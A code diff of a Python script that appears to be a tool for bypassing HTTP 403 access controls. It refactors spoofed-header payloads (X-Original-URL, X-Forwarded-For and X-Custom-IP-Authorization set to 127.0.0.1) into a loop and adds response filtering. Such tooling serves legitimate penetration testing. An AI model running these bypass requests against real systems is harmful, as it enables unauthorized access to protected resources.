@@ -76,24 +76,15 @@ def setup_payloads(parsed, pathPieces, query):
     return urls
 
 
-def send_headers(url, headers, cookies, proxies, path):
-    headers["X-Original-URL"] = path
+def send_header_payloads(url, headers, cookies, proxies, h, p):
+    headers[h] = p
     resp = requests.get(url, cookies=cookies, proxies=proxies, headers=headers, verify=False)
-    print("Response code: {}   Response length: {}   Header: X-Original-URL: {}\n".format(resp.status_code, len(resp.text), headers["X-Original-URL"]))
-    headers.pop("X-Original-URL")
+    headers.pop(h)
 
-    headers["X-Forwarded-For"] = "127.0.0.1"
-    resp = requests.get(url, cookies=cookies, proxies=proxies, headers=headers, verify=False)
-    print("Response code: {}   Response length: {}   Header: X-Forwarded-For: {}\n".format(resp.status_code, len(resp.text), headers["X-Forwarded-For"]))
-    headers.pop("X-Forwarded-For")
-
-    headers["X-Custom-IP-Authorization"] = "127.0.0.1"
-    resp = requests.get(url, cookies=cookies, proxies=proxies, headers=headers, verify=False)
-    print("Response code: {}   Response length: {}   Header: X-Custom-IP-Authorization: {}\n".format(resp.status_code, len(resp.text), headers["X-Custom-IP-Authorization"]))
-    headers.pop("X-Custom-IP-Authorization")
+    return resp.status_code, resp.text
 
 
-def send_payloads(s, url, cookies, proxies, hide):
+def send_url_payloads(s, url, cookies, proxies, hide):
     r = requests.Request("GET", url, cookies=cookies, headers=headers)
     prep = r.prepare()
     prep.url = url
@@ -101,7 +92,7 @@ def send_payloads(s, url, cookies, proxies, hide):
         resp = s.send(prep, verify=False)
     except requests.exceptions.ConnectionError as e:
         print(e)
-        pass
+
     return resp.status_code, resp.text
 
 
@@ -152,15 +143,25 @@ parsed = urlparse(url)
 path = parsed.path  # /some/path
 query = parsed.query  # param1=1param2=2
 pathPieces = ' '.join(parsed.path.split('/')).split()  # ['some', 'path']
-finalUrls = setup_payloads(parsed, pathPieces, query)
+url_payloads = setup_payloads(parsed, pathPieces, query)
 
-send_headers(url, headers, cookies, proxies, path)
+header_payloads = {
+    "X-Original-URL": path,
+    "X-Forwarded-For": "127.0.0.1",
+    "X-Custom-IP-Authorization": "127.0.0.1"
+    }
+
+for h, p in header_payloads.items():
+    resp_code, resp_text = send_header_payloads(url, headers, cookies, proxies, h, p)
+    MSG = "Response code: {}   Response length: {}   Header: {}: {}\n".format(resp_code, len(resp_text), h, p)
+
+    if hide["hc"] != str(resp_code) and hide["hl"] != str(len(resp_text)):
+        print(MSG)
 
 s = requests.Session()
 s.proxies = proxies
-for url in finalUrls:
-    resp_code, resp_text = send_payloads(s, url, cookies, proxies, hide)
-
+for url in url_payloads:
+    resp_code, resp_text = send_url_payloads(s, url, cookies, proxies, hide)
     MSG = "Response code: {}   Response length: {}   Path: {}\n".format(resp_code, len(resp_text), path)
 
     if hide["hc"] != str(resp_code) and hide["hl"] != str(len(resp_text)):
